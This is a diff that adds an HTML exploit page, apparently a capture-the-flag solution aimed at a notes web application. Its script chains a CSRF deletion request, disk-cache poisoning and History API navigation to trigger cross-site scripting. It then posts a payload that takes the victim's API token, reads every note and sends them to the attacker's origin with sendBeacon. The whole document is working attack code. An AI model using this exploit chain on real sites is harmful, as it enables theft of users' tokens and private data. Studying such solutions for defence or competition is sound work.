@@ -1,0 +1,84 @@
+<body>
+  <script>
+    const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));
+
+    const deleteNote = (url, noteId) => {
+      const form = document.createElement("form");
+      form.action = url;
+      form.method = "post";
+      form.target = "_blank";
+
+      const input = document.createElement("input");
+      input.name = "noteId";
+      input.value = noteId;
+      form.appendChild(input);
+
+      document.body.appendChild(form);
+      form.submit();
+    };
+
+    const evilJs = `
+      (async () => {
+        const { token } = await (await fetch("/api/token")).json();
+
+        const noteIds = await (
+          await fetch("/api/notes", {
+            headers: { "X-Token": token },
+          })
+        ).json();
+
+        const notes = await Promise.all(
+          noteIds.map((id) =>
+            fetch("/api/notes/" + id, {
+              headers: { "X-Token": token },
+            }).then((res) => res.text())
+          )
+        );
+
+        navigator.sendBeacon("${location.origin}", notes.join("\\n"));
+      })();
+    `;
+
+    const main = async () => {
+      const params = new URLSearchParams(location.search);
+      const baseUrl = params.get("baseUrl");
+      const noteId = params.get("noteId");
+
+      {
+        // Delete a note (and create a deleted page) with CSRF
+        const url = `${baseUrl}/api/notes/delete`;
+        deleteNote(url, noteId);
+      }
+      await sleep(1000);
+
+      let evilWindow;
+      {
+        // Access to the deleted page with no token
+        // Then, the browser will render a response with 500 status.
+        const url = `${baseUrl}/api/notes/${noteId}`;
+        evilWindow = open(url);
+      }
+      await sleep(1000);
+      {
+        // Open the bot's user page
+        // Then, it will pollute the disk cache for the deleted page.
+        evilWindow.location = baseUrl;
+      }
+      await sleep(1000);
+      {
+        // Access to the deleted page again using History API
+        // Then, the browser will render the cached page and the XSS will occur!
+        // Note that a bfcache will not be used because the page will have a window.opener reference.
+        //   ref. https://web.dev/i18n/en/bfcache/#avoid-windowopener-references
+        evilWindow.location = `${location.origin}/back.html?n=2`;
+      }
+      await sleep(1000);
+      {
+        // Send a JavaScript code via postMessage
+        // Then, the XSS window will execute it!
+        evilWindow.postMessage(evilJs, baseUrl);
+      }
+    };
+    main();
+  </script>
+</body>
